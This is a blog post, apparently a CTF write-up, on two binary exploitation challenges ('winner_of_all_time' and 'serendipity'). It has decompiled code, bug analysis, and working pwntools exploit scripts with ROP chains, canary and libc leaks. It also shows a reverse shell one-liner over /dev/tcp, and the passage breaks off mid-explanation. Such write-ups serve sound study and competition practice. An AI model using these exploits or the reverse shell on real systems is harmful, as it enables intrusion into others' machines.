@@ -1,0 +1,1220 @@
+---
+layout: post
+title:  "WannaGame ChampionShip 2023"
+date:   2023-12-03 15:14:54
+categories: pwn
+tags: ctf
+excerpt: 当年创建 jekyll 时默认的一篇文章，没什么意义，我也一直没删除，留个纪念吧。
+mathjax: true
+---
+
+## WannaGame ChampionShip 2023
+
+This past weekend, I played the WannaGame Championship CTF with my team 1337% Yogurt and we finished in the top 8 Global and top 2 in my University. Through this, I have managed to solved 2/2 pwn challenge `winner_of_all_time` and `serendipity`.
+
+![image](https://hackmd.io/_uploads/ryAWhnN8T.png)
+
+
+## 1. Winner of all time
+
+### Overview
+
+![image](https://hackmd.io/_uploads/S10id2EIa.png)
+
+### Analysis
+
+```cpp
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  unsigned int v3; // eax
+  __int64 v4; // rdi
+  int v5; // ebx
+  __int64 v7[21]; // [rsp+0h] [rbp-B0h]
+
+  v3 = time(0LL);
+  v4 = v3;
+  srand(v3);
+  magic = rand() % 123456789;
+  set_up(v4, a2);
+  banner();
+  puts("What time do you want to be back?");
+  while ( 1 )
+  {
+    printf("Timeline number [%d]: ", (unsigned int)idc);
+    v5 = idc;
+    v7[v5] = get_int();
+    if ( v7[idc] >= 123456790 )
+    {
+      puts("TVA: you commit the crime of time!!!");
+      exit(0);
+    }
+    if ( v7[idc] == magic )
+      break;
+    ++idc;
+  }
+  puts("Welcome to sanctuary of time");
+  return 0LL;
+}
+```
+
+Basically, the v7 array has only 21 member but in the while loop, it never break if the idx is large than 21, so we can easily build a rop chain and break the while with the magic (it's predictable).
+
+```cpp
+import ctypes
+LIBC = ctypes.cdll.LoadLibrary('/path/to/dll')
+LIBC.srand(LIBC.time(0))
+```
+I'm use this trick to bypass the check magic value 
+
+```cpp
+if ( v7[idc] >= 123456790 )
+{
+      puts("TVA: you commit the crime of time!!!");
+      exit(0);
+}
+```
+
+However, because of this check, we can't easily build a normal rop chain with the large address in libc. So, i manage to leak libc and use scanf("%lld", <got_addr>) to get shell !!!
+
+
+Here is my solve script
+```python
+from pwn import *
+from ctypes import*
+if args.LOCAL:
+    io=process('./winner_of_all_time')
+    if args.GDB:
+        cmd="""
+        init-pwndbg
+        b* 0x0000000000401589
+        """
+        gdb.attach(io, cmd)
+else:
+    io=remote('157.245.147.89', 25174)
+libc=ELF('./libc.so.6')
+elf=context.binary=ELF('./winner_of_all_time')        
+glibc = cdll.LoadLibrary('./libc.so.6')
+
+
+pop_rdi=0x0000000000401589
+pop_rsi_r15=0x0000000000401596
+ret=0x000000000040101a
+pop_rbp_ret=0x000000000040133e
+leave_ret=0x00000000004013ac
+glibc.srand(glibc.time(None))
+magic = glibc.rand() % 123456789
+print(magic)
+
+for i in range(22):
+    io.sendline(str(10).encode())
+
+rbp=0x404b00
+io.sendline(str(rbp).encode())
+
+add_nop_ret=0x000000000040127c
+mov_rbx=0x00000000004013a8
+scanf=0x404060
+d=0x000000000040270F
+pl=p64(pop_rdi)
+pl+=p64(elf.got.puts)
+pl+=p64(elf.sym.puts)
+pl+=p64(ret)
+pl+=p64(pop_rdi)
+pl+=p64(d)
+pl+=p64(pop_rsi_r15)
+pl+=p64(0x404f00)
+pl+=p64(0)
+pl+=p64(0x000000000401180)
+pl+=p64(ret)
+pl+=p64(pop_rdi)
+pl+=p64(d)
+pl+=p64(pop_rsi_r15)
+pl+=p64(0x404018)
+pl+=p64(0)
+pl+=p64(ret)
+pl+=p64(0x000000000401180)
+pl+=p64(pop_rdi)
+pl+=p64(0x404f00)
+pl+=p64(ret)
+pl+=p64(elf.sym.puts)
+
+
+for i in range(0, len(pl), 8):
+    io.sendline(str(u64(pl[i:i+8].ljust(8, b'\0'))).encode())
+pause()
+io.sendline(str(magic).encode())
+
+io.recvuntil(b' Welcome to sanctuary of time')
+io.recvline()
+
+libc.address=u64(io.recv(6).ljust(8, b'\0')) - libc.sym.puts
+print(hex(libc.address))
+og=libc.address+0x1052fa
+pause()
+io.sendline(str(u64(b'/bin//sh\0')).encode())
+pause()
+io.sendline(str(libc.sym.system).encode())
+io.interactive()
+```
+
+
+Get shell
+
+![image](https://hackmd.io/_uploads/rkoVlp4La.png)
+
+
+## 2. Serendipity
+
+### Overview
+
+![image](https://hackmd.io/_uploads/BJOd3h4I6.png)
+
+This chall provide 1 binary, attached libc.so.6 file, the `files` directory with has some constant file that use in binary after, and a file name user_config that has KEY and IV value, ok we'll find out later
+
+
+![image](https://hackmd.io/_uploads/B1r_03VUa.png)
+
+Hmm, it's a 64 bits ELF file and has full protect, sound good to play with it. Let's go to vector exploit ...
+
+
+### Analysis
+
+```cpp
+void __fastcall __noreturn main(int a1, char **a2, char **a3)
+{
+  unsigned int i; // [rsp+4h] [rbp-ECh]
+  int v4; // [rsp+8h] [rbp-E8h]
+  int j; // [rsp+Ch] [rbp-E4h]
+  pthread_t newthread; // [rsp+10h] [rbp-E0h] BYREF
+  struct sockaddr *addr; // [rsp+18h] [rbp-D8h]
+  void *v8; // [rsp+20h] [rbp-D0h]
+  fd_set *p_readfds; // [rsp+28h] [rbp-C8h]
+  void *buf; // [rsp+30h] [rbp-C0h]
+  ssize_t v11; // [rsp+38h] [rbp-B8h]
+  struct timeval timeout; // [rsp+40h] [rbp-B0h] BYREF
+  struct sockaddr s; // [rsp+50h] [rbp-A0h] BYREF
+  fd_set readfds; // [rsp+60h] [rbp-90h] BYREF
+  unsigned __int64 v15; // [rsp+E8h] [rbp-8h]
+
+  v15 = __readfsqword(0x28u);
+  pipe(p0);
+  pipe(p1);
+  pipe(p2);
+  pipe(p3);
+  if ( pthread_mutex_init(&mutex, 0LL) || pthread_mutex_init(&mutex2, 0LL) )
+    error("pthread_mutex_init");
+  pthread_create(&newthread, 0LL, session, 0LL);
+  fd = socket(2, 2, 0);
+  if ( fd == -1 )
+    error("socket");
+  memset(&s, 0, sizeof(s));
+  s.sa_family = 2;
+  *(_WORD *)s.sa_data = htons(0x26FDu);
+  *(_DWORD *)&s.sa_data[2] = 0;
+  if ( bind(fd, &s, 0x10u) == -1 )
+    error("bind");
+  addr = (struct sockaddr *)malloc(0x214uLL);
+  v8 = malloc(0x100CuLL);
+  while ( 1 )
+  {
+    do
+    {
+      p_readfds = &readfds;
+      for ( i = 0; i <= 0xF; ++i )
+        p_readfds->fds_bits[i] = 0LL;
+      readfds.fds_bits[fd / 64] |= 1LL << (fd & 0x3F);
+      timeout.tv_sec = 1LL;
+      timeout.tv_usec = 0LL;
+      if ( select(fd + 1, &readfds, 0LL, 0LL, &timeout) == -1 )
+        error("select");
+    }
+    while ( (readfds.fds_bits[fd / 64] & (1LL << (fd & 0x3F))) == 0 );
+    buf = calloc(1uLL, 0x1000uLL);
+    memset(addr, 0, 0x214uLL);
+    memset(v8, 0, 0x100CuLL);
+    *(_DWORD *)&addr[1].sa_family = 16;
+    v11 = recvfrom(fd, buf, 0x1000uLL, 0, addr, (socklen_t *)&addr[1].sa_family);
+    if ( v11 == -1 )
+      error("recvfrom");
+    v4 = 0;
+    for ( j = 0; ; ++j )
+    {
+      if ( j > 3 )
+        goto LABEL_22;
+      if ( *(_QWORD *)buf == *((_QWORD *)&thread_id + 2 * j) )
+        break;
+    }
+    write(p0[2 * j + 1], buf, 0x1000uLL);
+    v4 = 1;
+LABEL_22:
+    if ( !v4 && !(unsigned int)check_data(addr, v8, buf) )
+      use_opcode(addr, v8);
+  }
+
+```
+
+We will analyze each stage.
+
+First, the server create a connection use UDP method that allowing users to send packet to.
+
+```cpp
+void __fastcall __noreturn session(void *a1)
+{
+  int i; // [rsp+4h] [rbp-Ch]
+  time_t v2; // [rsp+8h] [rbp-8h]
+
+  while ( 1 )
+  {
+    pthread_mutex_lock(&mutex);
+    v2 = time(0LL);
+    for ( i = 0; i <= 3; ++i )
+    {
+      if ( *((_QWORD *)&unk_6100 + 2 * i) )
+      {
+        if ( v2 >= qword_6108[2 * i] )
+        {
+          *((_QWORD *)&unk_6100 + 2 * i) = 0LL;
+          qword_6108[2 * i] = 0LL;
+          printf("session %d cleaned\n", (unsigned int)i);
+        }
+      }
+    }
+    pthread_mutex_unlock(&mutex);
+    sleep(1u);
+  }
+}
+```
+
+It's create 4 pipe, use pthread to create a maximum 4 thread for connection, read and write. 
+
+```cpp
+select(fd + 1, &readfds, 0LL, 0LL, &timeout) == -1 
+```
+
+After that, it's create a UDP connection and use select function to handle mutiples file descriptors, waiting until one or more of the file descriptors become "ready".
+
+It's use `sendto()` and `recvfrom()` functions to send and receive data to users.
+
+
+```cpp
+v11 = recvfrom(fd, buf, 0x1000uLL, 0, addr, (socklen_t *)&addr[1].sa_family);
+```
+
+The data that program expect user to send to has this struct below
+
+```cpp
+struct data {
+    unsigned int32 magic;
+    unsigned int32 op_code;
+    unsigned int16 size;
+    char mess[4086];
+}
+```
+
+Next, it check the message receive from user, if it check with each `thread_id`, the file of op_code is ignore and use the the first 8 bytes to compare with each `thread_id`.
+```cpp 
+struct session_data {
+    unsigned int64 thread_id;
+    unsigned int16 size;
+    char mess[4086];
+}
+``` 
+
+If it match, is has write the message to the the pipe write of the appropriate thread and continue the loop.
+ 
+```cpp
+for ( j = 0; ; ++j )
+    {
+      if ( j > 3 )
+        goto LABEL_22;
+      if ( *(_QWORD *)&buf->magic == *((_QWORD *)&thread_id + 2 * j) )
+        break;
+    }
+    write(p0[2 * j + 1], buf, 0x1000uLL);
+    v4 = 1;
+LABEL_22:
+    if ( !v4 && !(unsigned int)check_data(addr, v8, (__int64)buf) )
+      use_opcode((__int64)addr, (__int64)v8);
+```
+
+Ortherwise, it will go to the `check_data()` function.
+
+```c
+__int64 __fastcall check_data(const struct sockaddr *a1, data *a2, data *a3)
+{
+  int v3; // eax
+  int v5; // eax
+
+  a2->magic = a3->magic;
+  if ( a2->magic == 0x70303070 )
+  {
+    a2->opcode = a3->opcode;
+    a2->size = a3->size;
+    if ( a2->size <= 0xFFFu )
+    {
+      memcpy(a2->mess, a3->mess, (unsigned __int16)a2->size);
+      return 0LL;
+    }
+    else
+    {
+      memset(&a1[1].sa_data[2], 0, 0x200uLL);
+      strcpy(&a1[1].sa_data[2], "packet too large\n");
+      v5 = strlen(&a1[1].sa_data[2]);
+      send_to(a1, (__int64)&a1[1].sa_data[2], v5);
+      return 1LL;
+    }
+  }
+  else
+  {
+    memset(&a1[1].sa_data[2], 0, 0x200uLL);
+    strcpy(&a1[1].sa_data[2], "server magic mismatch\n");
+    v3 = strlen(&a1[1].sa_data[2]);
+    send_to(a1, (__int64)&a1[1].sa_data[2], v3);
+    return 1LL;
+  }
+}
+```
+
+It's check the magic field of the message equivalent to `0x70303070` and the size field has been small than 4095. If the condition both matches, it copy the message to use to another function`use_opcode()` that i will talk later. Ortherwise, it return 1 and return to the loop. 
+
+
+```cpp
+void __fastcall use_opcode(const struct sockaddr *a1, data *a2)
+{
+  unsigned int opcode; // eax
+  int v3; // eax
+
+  opcode = a2->opcode;
+  if ( opcode == 0x301 )
+  {
+    print_data(a1, a2);
+  }
+  else
+  {
+    if ( opcode > 0x301 )
+      goto LABEL_9;
+    if ( opcode == 0x101 )
+    {
+      generate_str(a1);
+      return;
+    }
+    if ( opcode == 0x201 )
+    {
+      authenticate(a1, a2);
+    }
+    else
+    {
+LABEL_9:
+      memset(&a1[1].sa_data[2], 0, 0x200uLL);
+      strcpy(&a1[1].sa_data[2], "unknown opcode\n");
+      v3 = strlen(&a1[1].sa_data[2]);
+      send_to(a1, (__int64)&a1[1].sa_data[2], v3);
+    }
+  }
+}
+```
+
+There are 3 op_code `[0x301, 0x101, 0x201]`. I will talk about those opcodes in turn.
+
+`0x301 opcode`
+
+```cpp
+unsigned __int64 __fastcall print_data(const struct sockaddr *a1, data *a2)
+{
+  int s[2]; // [rsp+10h] [rbp-1020h] BYREF
+  __int16 size; // [rsp+18h] [rbp-1018h]
+  _BYTE v5[6]; // [rsp+1Ah] [rbp-1016h] BYREF
+  unsigned __int64 v6; // [rsp+1028h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  memset(s, 0, 0x100CuLL);
+  s[0] = a2->magic;
+  s[1] = a2->opcode;
+  memcpy(v5, a2->mess, (unsigned __int16)a2->size);
+  size = a2->size;
+  memset(&a1[1].sa_data[2], 0, 0x200uLL);
+  memcpy(&a1[1].sa_data[2], s, (unsigned __int16)a2->size + 10);
+  send_to(a1, (__int64)&a1[1].sa_data[2], (unsigned __int16)a2->size + 10);
+  return v6 - __readfsqword(0x28u);
+}
+```
+
+It's symply send the data that user has been send to the user. Does it safely ?
+
+```cpp
+addr = (struct sockaddr *)malloc(532uLL);
+v8 = (data *)malloc(0x100CuLL);
+```
+
+Noticing the variable sockaddr *a1 that has 0x200 byte in data field, and the varible data *a2 is the array has 0x1000C bytes of data
+
+```
+memcpy(&a1[1].sa_data[2], s, (unsigned __int16)a2->size + 10);
+```
+When it use memcpy to copy `s` to `&a1[1].sa_data[2]` with the size large than 0x200, because a2 is below a1 struct in heap mapping address, it cause message of v5 overflow in the metadata field (magic, opcode, size) of a2, so i have the OOB bug.
+
+```cpp
+pwndbg> tel 100
+00:0000│ rsp 0x7ffc4d8e0b30 —▸ 0x5584a5b415e0 ◂— 0x4141414141414141 ('AAAAAAAA') // a2
+01:0008│     0x7ffc4d8e0b38 —▸ 0x5584a5b413c0 ◂— 0x100007faf910002               // a1
+02:0010│     0x7ffc4d8e0b40 ◂— 0x30170303070
+03:0018│     0x7ffc4d8e0b48 ◂— 0x4141414141410fff
+04:0020│     0x7ffc4d8e0b50 ◂— 0x4141414141414141 ('AAAAAAAA')
+... ↓        95 skipped
+pwndbg>
+```
+
+```cpp
+► 0x56244a4b4a17    call   sendto@plt                <sendto@plt>
+        fd: 0xb (socket:[133812])
+        buf: 0x56244bdc63d4 ◂— 0x30170303070
+        n: 0x1000
+        flags: 0x0
+        addr: 0x56244bdc63c0 ◂— 0x100007f1ad40002
+        addr_len: 0x10
+ 
+   0x56244a4b4a1c    cmp    rax, -1
+   0x56244a4b4a20    jne    0x56244a4b4a31                <0x56244a4b4a31>
+ 
+   0x56244a4b4a22    lea    rax, [rip + 0x15fb]
+   0x56244a4b4a29    mov    rdi, rax
+   0x56244a4b4a2c    call   error                <error>
+────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffd3980e4b0 ◂— 0x4
+01:0008│     0x7ffd3980e4b8 ◂— 0x414b00000001
+02:0010│     0x7ffd3980e4c0 —▸ 0x56244bdc63d4 ◂— 0x30170303070
+03:0018│     0x7ffd3980e4c8 —▸ 0x56244bdc63c0 ◂— 0x100007f1ad40002
+04:0020│     0x7ffd3980e4d0 ◂— 0x2158f0
+05:0028│     0x7ffd3980e4d8 ◂— 0x100000000000
+06:0030│ rbp 0x7ffd3980e4e0 —▸ 0x7ffd3980f520 —▸ 0x7ffd3980f540 —▸ 0x7ffd3980f640 ◂— 0x1
+07:0038│     0x7ffd3980e4e8 —▸ 0x56244a4b5101 ◂— nop 
+──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x56244a4b4a17
+   1   0x56244a4b5101
+   2   0x56244a4b56ff
+   3   0x56244a4b5b78
+   4   0x7fc435a29d90 __libc_start_call_main+128
+   5   0x7fc435a29e40 __libc_start_main_impl+128
+   6   0x56244a4b45e5
+──────────────────────────────────────────────────────────────────────────────────[ THREADS (3 TOTAL) ]──────────────────────────────────────────────────────────────────────────────────
+  ► 1   "serendipity_pat" stopped: 0x56244a4b4a17
+    2   "serendipity_pat" stopped: 0x7fc435ae57f8 <clock_nanosleep@GLIBC_2.2.5+200> 
+    3   "serendipity_pat" stopped: 0x7fc435b14a0c <read+76> 
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg>
+```
+
+So, i have the loop of send_to with 4 time to leak the size of 0x1000, so it print many data in the heap as libc and heap address.
+
+But, on the server, due to the I/O handle or somehow, i couldn't manage to trigger that bug to leak any address. So we should find another way !
+
+
+`opcode 0x101` 
+```cpp
+unsigned __int64 __fastcall generate_str(const struct sockaddr *a1)
+{
+  __int64 v1; // rdx
+  __int64 v2; // rdx
+  unsigned int v3; // eax
+  int v5; // [rsp+14h] [rbp-ACh]
+  char *rand; // [rsp+18h] [rbp-A8h]
+  void *v7; // [rsp+20h] [rbp-A0h]
+  void *v8; // [rsp+28h] [rbp-98h]
+  char s[136]; // [rsp+30h] [rbp-90h] BYREF
+  unsigned __int64 v10; // [rsp+B8h] [rbp-8h]
+
+  v10 = __readfsqword(0x28u);
+  rand = generate_rand(32);
+  v1 = *((_QWORD *)rand + 1);
+  *(_QWORD *)s1 = *(_QWORD *)rand;
+  qword_6148 = v1;
+  v2 = *((_QWORD *)rand + 3);
+  qword_6150 = *((_QWORD *)rand + 2);
+  qword_6158 = v2;
+  v7 = calloc(1uLL, 0x10uLL);
+  v8 = calloc(1uLL, 0x10uLL);
+  memset(s, 0, 0x80uLL);
+  key_iv((__int64)v7, (__int64)v8);
+  v3 = strlen(rand);
+  v5 = encrypt((__int64)s1, v3, (__int64)v7, (__int64)v8, (__int64)s);
+  send_to(a1, (__int64)s, v5);
+  return v10 - __readfsqword(0x28u);
+}
+```
+
+This code genarate a array of 32 random bytes use `srand(time(0))`, so i can easily predict it.
+
+```cpp
+_BYTE *__fastcall sub_293B(int a1)
+{
+  unsigned int v1; // eax
+  int i; // [rsp+14h] [rbp-Ch]
+  _BYTE *v4; // [rsp+18h] [rbp-8h]
+
+  v1 = time(0LL);
+  srand(v1);
+  v4 = calloc(1uLL, a1 + 1);
+  for ( i = 0; i < a1; ++i )
+  {
+    do
+      v4[i] = rand();
+    while ( !v4[i] );
+  }
+  return v4;
+}
+```
+
+Continue, it copy the KEY and IV from the file `user_config` to encrypt with previous random data.
+
+`opcode 0x201` - The last opcode
+
+```cpp
+void __fastcall authenticate(const struct sockaddr *a1, data *a2)
+{
+  int v2; // eax
+  int v3; // eax
+  int v4; // eax
+  int i; // [rsp+14h] [rbp-Ch]
+
+  if ( !strncmp(s1, (const char *)a2->mess, 32uLL) )
+  {
+    memset(&a1[1].sa_data[2], 0, 0x200uLL);
+    strcpy(&a1[1].sa_data[2], "auth successfully\n");
+    v3 = strlen(&a1[1].sa_data[2]);
+    send_to(a1, (__int64)&a1[1].sa_data[2], v3);
+    for ( i = 0; i <= 3; ++i )
+    {
+      if ( !*((_QWORD *)&thread_id + 2 * i) )
+      {
+        *((_QWORD *)&thread_id + 2 * i) = *(_QWORD *)generate_rand(8);
+        thread[2 * i] = time(0LL) + 60;
+        memset(&a1[1].sa_data[2], 0, 0x200uLL);
+        strncpy(&a1[1].sa_data[2], (const char *)&thread_id + 16 * i, 8uLL);
+        send_to(a1, (__int64)&a1[1].sa_data[2], 8);
+        create_new_thread((__int64)a1, (__int64)a2, i);
+        return;
+      }
+    }
+    memset(&a1[1].sa_data[2], 0, 0x200uLL);
+    strcpy(&a1[1].sa_data[2], "only 4 sessions at a time\n");
+    v4 = strlen(&a1[1].sa_data[2]);
+    send_to(a1, (__int64)&a1[1].sa_data[2], v4);
+  }
+  else
+  {
+    memset(&a1[1].sa_data[2], 0, 0x200uLL);
+    strcpy(&a1[1].sa_data[2], "auth failed\n");
+    v2 = strlen(&a1[1].sa_data[2]);
+    send_to(a1, (__int64)&a1[1].sa_data[2], v2);
+  }
+}
+```
+
+It compare the ecnrypt data from `opcode 0x101` function with the global variable `s1`. 
+I can use the trick from the first challenge to predict it data. But i needn't do that because the s1 is intialize when i use `opcode 0x101`. So basically when i don't use `opcode 0x101` , the `s1` variable don't intialize and i'm simply to bypass that with `NULL` byte.
+
+If auth successfully, it generate a session id and save it in global variable `thread_id` that i mentioned before and send it to user. After that, it create new thread with the entry `start_routine()` function and take the struct address and the data as 2 arguments for the thread.
+
+```cpp
+int __fastcall create_new_thread(__int64 a1, __int64 a2, int a3)
+{
+  _DWORD *arg; // [rsp+28h] [rbp-8h]
+
+  arg = calloc(1uLL, 0x10uLL);
+  *(_QWORD *)arg = a1;
+  arg[2] = a3;
+  return pthread_create(&qword_60E0[a3], 0LL, (void *(*)(void *))start_routine, arg);
+}
+```
+
+
+
+`start_routine`
+
+```cpp
+void *__fastcall start_routine(_DWORD *a1)
+{
+  int v1; // eax
+  int v3; // eax
+  size_t v4; // rax
+  int v5; // eax
+  int v6; // eax
+  int v7; // [rsp+1Ch] [rbp-344h]
+  const struct sockaddr *v8; // [rsp+20h] [rbp-340h]
+  read_file *buf; // [rsp+28h] [rbp-338h]
+  FILE *stream; // [rsp+30h] [rbp-330h]
+  __int64 s; // [rsp+40h] [rbp-320h] BYREF
+  int type; // [rsp+48h] [rbp-318h]
+  unsigned __int16 size; // [rsp+4Ch] [rbp-314h]
+  _BYTE v14[258]; // [rsp+4Eh] [rbp-312h] BYREF
+  char dest[8]; // [rsp+150h] [rbp-210h] BYREF
+  __int64 v16; // [rsp+158h] [rbp-208h] BYREF
+  char ptr[264]; // [rsp+250h] [rbp-110h] BYREF
+  unsigned __int64 v18; // [rsp+358h] [rbp-8h]
+
+  v18 = __readfsqword(0x28u);
+  v8 = *(const struct sockaddr **)a1;
+  v7 = a1[2];
+  buf = (read_file *)calloc(1uLL, 0x1000uLL);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      memset(&s, 0, 0x110uLL);
+      memset(dest, 0, 0x100uLL);
+      memset(ptr, 0, 0x100uLL);
+      read(p0[2 * v7], buf, 0x1000uLL);
+      s = buf->session;
+      type = buf->type;
+      size = buf->size;
+      memcpy(v14, buf->file_name, size);
+      memcpy(dest, "./files/", sizeof(dest));
+      memcpy(&v16, v14, 0xF0uLL);
+      if ( strstr(dest, "..") )
+      {
+        memset(&v8[1].sa_data[2], 0, 0x200uLL);
+        strcpy(&v8[1].sa_data[2], "invalid file\n");
+        v1 = strlen(&v8[1].sa_data[2]);
+        send_to(v8, (__int64)&v8[1].sa_data[2], v1);
+        return 0LL;
+      }
+      if ( !type )
+        break;
+      if ( type == 1 )
+      {
+        memset(&v8[1].sa_data[2], 0, 0x200uLL);
+        strcpy(&v8[1].sa_data[2], "under construction\n");
+        v6 = strlen(&v8[1].sa_data[2]);
+        send_to(v8, (__int64)&v8[1].sa_data[2], v6);
+      }
+    }
+    stream = fopen(dest, "r");
+    if ( !stream )
+      break;
+    fread(ptr, 0x100uLL, 1uLL, stream);
+    memset(&v8[1].sa_data[2], 0, 0x200uLL);
+    v4 = strlen(ptr);
+    strncpy(&v8[1].sa_data[2], ptr, v4);
+    v5 = strlen(&v8[1].sa_data[2]);
+    send_to(v8, (__int64)&v8[1].sa_data[2], v5);
+    fclose(stream);
+  }
+  memset(&v8[1].sa_data[2], 0, 0x200uLL);
+  strcpy(&v8[1].sa_data[2], "file can't be read\n");
+  v3 = strlen(&v8[1].sa_data[2]);
+  send_to(v8, (__int64)&v8[1].sa_data[2], v3);
+  return 0LL;
+}
+```
+
+It's read data from the pipe read of the current session. You may notice that in the main function it's has check if the first 8 bytes match with session id, it will perform to write in the pipe_write of this thread. So, i'm easily to manage communication between it.
+
+
+### Read Primitive
+
+```
+╭─    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                         ✔  w1n_gl0ry@phis1Ng ─╮
+╰─ ls files                                                                                                                                                        ─╯
+dance_of_the_petals  echoes_of_dawn  lullaby_of_the_rain  moonlit_embrace  whispers_of_serenity
+```
+
+Basically, the function take the message as the argument to perform read in this file we choose.
+
+
+```cpp
+struct read_file {
+    char session[8];
+    unsigned int32 type;
+    unsigned int16 size;
+    char file_name[4082];
+}
+```
+
+Notice that the `file_name` field we have manage up to 4082 bytes and the `size` file up to 0xfff bytes.
+ 
+```cpp
+memset(&s, 0, 0x110uLL);
+memset(dest, 0, 0x100uLL);
+memset(ptr, 0, 0x100uLL);
+read(p0[2 * v7], buf, 0x1000uLL);
+s = buf->session;
+type = buf->type;
+size = buf->size;
+memcpy(v14, buf->file_name, size);
+memcpy(dest, "./files/", sizeof(dest));
+
+```
+
+However, the v14 has only 258 bytes, so we can easily perform overflow.
+
+```cpp
+fread(ptr, 0x100uLL, 1uLL, stream);
+memset(&v8[1].sa_data[2], 0, 0x200uLL);
+v4 = strlen(ptr);
+strncpy(&v8[1].sa_data[2], ptr, v4);
+v5 = strlen(&v8[1].sa_data[2]);
+send_to(v8, (__int64)&v8[1].sa_data[2], v5);
+fclose(stream);
+```
+
+The `fread()` function doesn't put null byte at the end of string, so we basically make v4 to large than the ptr capacity. It's make a powerful of read primitive. So i can easily setup to leak canary and libc address.
+
+
+```python
+from pwn import *
+if args.LOCAL:
+    io=process('./serendipity_patched')
+    if args.GDB:
+        cmd="""
+        init-pwndbg
+        brva 0x0000000000002FD7
+        """
+        gdb.attach(io, cmd)
+else:
+    io=remote('157.245.147.89', 25201, typ="udp")
+elf=context.binary=ELF('./serendipity_patched')
+libc=ELF('./libc.so.6') 
+
+io.interactive()                       
+```
+
+I use this code to locate a server and easily to debug and connect with `nc -u 0 9981` in my local machine or just use pwntools
+
+```python
+from pwn import *
+from ctypes import *
+import socket 
+from time import sleep 
+import sys
+
+libc=ELF('./libc.so.6')
+glibc = cdll.LoadLibrary('libc.so.6')
+#io=remote('157.245.147.89', 24210, typ="udp")
+io=remote('0', 9981, typ='udp')
+
+opcode=[0x301, 0x101, 0x201]
+
+def printdata(size, data):
+    pl=p32(0x70303070)
+    pl+=p32(opcode[0])
+    pl+=p16(size)
+    pl+=data
+    io.send(pl)
+    
+plain=b''
+session=b''
+def genarate_rand_string(size=0, data=0):
+    global plain
+    pl=p32(0x70303070)
+    pl+=p32(opcode[1])
+    pl+=p16(size)
+    pl+=b'A'*100
+    io.send(pl)
+    glibc.srand(glibc.time(None))
+    for i in range(32):
+        plain+=p8(glibc.rand() & 0xff)    
+    print(plain.hex())
+    data= io.recv()
+    return data
+    
+def authenticate(size=0):
+    global session
+    pl=p32(0x70303070)
+    pl+=p32(opcode[2])
+    pl+=p16(0x100)
+    pl+=plain
+    io.send(pl)
+    data= io.recv()
+    session=io.recv()
+    print(data)
+    return session
+     
+genarate_rand_string()  
+a=authenticate()
+print(a)
+pause()
+printdata(0xfff, b'A'*0xfff)
+print(io.recv())
+data=io.recv(0x1000)
+heap=u64(data[4:10].ljust(8, b'\0')) - 0x4ba0
+print(hex(heap))
+```
+
+This code perform leak heap via `opcode 0x301` but fail in the server :((
+
+We have to leak canary and libc via `opcode 0x101`
+
+```cpp
+session=a
+buf=session
+buf+=p32(0)
+buf+=p16(0x30a+1)
+buf+=b'moonlit_embrace\0'
+buf+=(778+1-len(b'moonlit_embrace\0'))*b'A'
+
+
+io.send(buf)
+data = io.recv()
+leak=u64(b'\0'+data[265:])
+log.info("canary: " + hex(leak))
+
+session=a
+buf=session
+buf+=p32(0)
+buf+=p16(0x30a+1+7+8)
+buf+=b'moonlit_embrace\0'
+buf+=(778+8-len(b'moonlit_embrace'))*b'A'
+buf+=data[265:]
+buf+=b'A'*8
+
+io.send(buf)
+
+data = io.recv()
+libc.address=u64(data[264+8+8:].ljust(8, b'\0')) - 0x94ac3
+log.info("libc.address: " + hex(libc.address))
+
+```
+
+Here is result:
+```cpp
+╭─    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                       1 ✘  w1n_gl0ry@phis1Ng ─╮
+╰─ python3 remote.py                                                                                                                                               ─╯
+[*] '/home/w1n_gl0ry/CTF/Pwnable/2023/wc2023/serendipity/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 0 on port 9981: Done
+85026bdce60e5a253187b0a061854c0269225675b70fcadd25c7353058ffb4dd
+b'auth successfully\n'
+[*] canary: 0x89f7373a66e1cd00
+[*] libc.address: 0x7f4413600000
+[*] Switching to interactive mode
+$  
+```
+
+
+### Get Shell ?
+
+We have successfully to leak and how we can get shell through UDP connection?
+
+Hmm, i just use this trick to perform reverse shell:
+* Listen on a port 1337:
+```c
+╭─    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                                           ✔  w1n_gl0ry@phis1Ng ─╮
+╰─ nc -lnvp 1337                                                                                                                                                                     ─╯
+Listening on 0.0.0.0 1337
+```
+
+* We use system function in my rop to execute command:
+
+```c
+system('bash -c \'exec bash -i &>/dev/tcp/0/1337 <&1\'')
+
+```
+
+Result:
+```c
+╭─    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                                           ✔  w1n_gl0ry@phis1Ng ─╮
+╰─ nc -lnvp 1337                                                                                                                                                                     ─╯
+Listening on 0.0.0.0 1337
+Connection received on 127.0.0.1 34014
+w1n_gl0ry@phis1Ng:~/CTF/Pwnable/2023/wc2023/serendipity$ 
+w1n_gl0ry@phis1Ng:~/CTF/Pwnable/2023/wc2023/serendipity$ id
+id
+uid=1000(w1n_gl0ry) gid=1000(w1n_gl0ry) groups=1000(w1n_gl0ry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),118(lpadmin)
+```
+
+We have successfully to use reverse shell to RCE. Unfornatunely, in the server, author remind me that the docker has block the network outside of that and we don't manage to get shell on that -.-
+
+
+### final phase
+
+During the contest, i think of another approach, simply perform the open-read-write to get flag, the author has also hint the location of flag `/home/user/flag`. But can we get flag with write to stdout ?
+
+No! We have to think another approach to send the flag over the udp connection and simly i perform a open-read-sendto chain to get_flag through local to server!
+
+So, sendto syscall need which arguments ?
+```c
+ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen);
+```
+
